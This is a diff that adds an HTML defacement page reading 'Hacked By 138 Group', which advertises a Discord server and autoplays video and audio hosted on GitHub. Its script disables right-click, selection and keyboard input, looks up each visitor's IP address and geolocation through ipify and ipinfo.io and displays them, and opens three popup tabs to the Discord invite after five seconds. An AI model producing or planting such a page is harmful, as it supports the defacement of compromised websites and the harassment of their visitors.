@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <base href="">
+    <title>Owned By 138 Group</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+    <link rel="shortcut icon" href="https://media.discordapp.net/attachments/1270575022775468054/1270870015784124518/138_copy.png?ex=66b5456f&is=66b3f3ef&hm=90343e31d5bc0892f9dd8dd10856037a058e81e62e568db572ed8c3ba6f87473&=&format=webp&quality=lossless&width=409&height=409">
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+        .video-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+        .video-bg video {
+            min-width: 100%;
+            min-height: 100%;
+            width: auto;
+            height: auto;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: -1;
+        }
+        .content {
+            position: relative;
+            z-index: 1;
+            text-align: center;
+            color: white;
+        }
+    </style>
+</head>
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false" onkeydown="return false" bgcolor="black">
+
+    <div class="video-bg">
+        <video autoplay muted loop>
+            <source src="https://github.com/qfhiw/lix/raw/main/1388.mp4" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
+    </div>
+
+    <div class="content">
+        <center><br><br>
+        <div class="imagehold">
+            <img src="" width="0" height="0">
+            <div style="color:red;font:12pt Courier New;"></div><br>
+            <div style="color:red;font:15pt Courier New;"><b>  Hacked By 138 Group </b></div><br>
+            <div style="color:blue;font:12pt Courier New;"><b> my discord <font color="white"> Discord.gg/sdw </font></b></div><br><br>
+        </center>
+        <br><br>
+        <center><font color="white"> No anti cheat :/</font></center>
+        <br><br>
+        <div style="color:white;">
+            <b>your ip :</b> <span id="ip-address-value">Fetching...</span><br>
+            <b>ip info:</b>
+            <pre id="ip-info">Fetching...</pre>
+        </div>
+    </div>
+
+    <script type="text/javascript">
+        //form tags to omit in NS6+:
+        var omitformtags=["input", "textarea", "select"];
+        omitformtags=omitformtags.join("|");
+
+        function disableselect(e){
+            if (omitformtags.indexOf(e.target.tagName.toLowerCase())==-1)
+                return false;
+        }
+
+        function reEnable(){
+            return true;
+        }
+
+        if (typeof document.onselectstart != "undefined")
+            document.onselectstart = new Function ("return false");
+        else {
+            document.onmousedown = disableselect;
+            document.onmouseup = reEnable;
+        }
+
+        // JavaScript code to fetch and display the user's IP address and information
+        function fetchIPAndInfo() {
+            fetch('https://api.ipify.org/?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ip-address-value').textContent = data.ip;
+                    return data.ip;
+                })
+                .then(ip => fetch(`https://ipinfo.io/${ip}/json`))
+                .then(response => response.json())
+                .then(ipInfoData => {
+                    document.getElementById('ip-info').textContent = JSON.stringify(ipInfoData, null, 2);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    document.getElementById('ip-address-value').textContent = 'Unable to fetch IP address.';
+                    document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
+                });
+        }
+
+        // Fetch IP address and information initially
+        fetchIPAndInfo();
+
+        // JavaScript code to open multiple tabs after 5 seconds
+        window.onload = function() {
+            setTimeout(function() {
+                window.open('https://Discord.gg/sdw','_blank');
+                window.open('https://Discord.gg/sdw','_blank');
+                window.open('https://Discord.gg/sdw','_blank');
+            }, 5000);
+        }
+    </script>
+	<audio src="https://github.com/qfhiw/lix/raw/main/audio.MP3" autoplay="true" id="lagu" loop=""></audio>
+</body>
+</html>
